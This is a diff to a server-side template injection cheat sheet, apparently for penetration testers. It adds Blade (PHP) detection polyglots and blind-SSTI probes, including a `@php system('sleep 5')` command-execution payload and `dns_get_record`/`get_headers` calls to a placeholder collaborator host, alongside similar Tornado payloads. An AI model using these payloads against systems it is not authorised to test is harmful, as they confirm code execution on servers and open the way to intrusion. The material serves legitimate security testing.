@@ -123,3 +123,27 @@
 - `{{ __import__('time').sleep(5) }}` - Time based
 - `{{ __import__('socket').gethostbyname('tornado-engine.<your-webhooks-/-collaborator>') }}` - DNS
 - `{{ __import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>') }}` - Web traffic
+
+
+## PHP Template Engines
+
+### Blade Detection
+
+#### Specific Error-Based Polyglots
+- `<%{{#{%>}`- Unmodified
+- `{{@` - Unmodified
+- `{{` - Unmodified
+
+#### Specific Non-Error-Based Polyglots
+- `{#${{1}}#}}` - `{#$1#}}`
+
+#### Blind SSTI
+- `@php system('sleep 5'); @endphp` - delays can be observed
+- `{{ print_r(dns_get_record(uniqid().'<your-webhooks-/-collaborator>', DNS_A)) }}` - DNS based if web traffic is blocked
+> Here, the dns_get_record is an native php utility. Also uniqid() prevents from caching the DNS traffic thus no hits will be observed
+- `{{ print_r(get_headers('http://'.uniqid().'<your-webhooks-/-collaborator>')) }}` - HTTP request trigger works only if web traffic is allowed
+> Here, get_headers is an native php utility.
+
+#### To run the lab
+> composer require illuminate/view illuminate/events
+> php -s <Socket>
